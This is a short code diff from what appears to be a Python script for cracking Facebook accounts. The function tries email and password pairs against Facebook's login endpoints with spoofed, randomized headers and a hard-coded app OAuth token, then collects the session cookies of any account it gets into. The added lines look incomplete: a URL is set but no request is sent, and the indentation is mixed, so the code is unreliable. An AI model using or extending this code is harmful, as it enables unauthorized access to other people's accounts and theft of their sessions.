@@ -238,25 +238,19 @@ def shakilx(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-    'method':'POST',
-    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
-    'scheme':'https',
-    'accept': '*/*',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://m.facebook.com',
-    'referer': 'https://m.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'x-asbd-id': '198387',
-    'x-fb-lsd': 'AVoPmsopEAk',
-    'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            head = {
+				'content-type':'application/x-www-form-urlencoded',
+				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+				'x-fb-connection-type':'unknown',
+				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+				'user-agent':ua_string,
+				'x-fb-net-hni':str(random.randint(2e4,4e4)),
+				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+				'x-fb-connection-quality':'EXCELLENT',
+				'x-fb-friendly-name':'authenticate',
+				'accept-encoding':'gzip, deflate',
+				'x-fb-http-engine':	'Liger'}
+				url = 'https://b-api.facebook.com/method/auth.login'
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
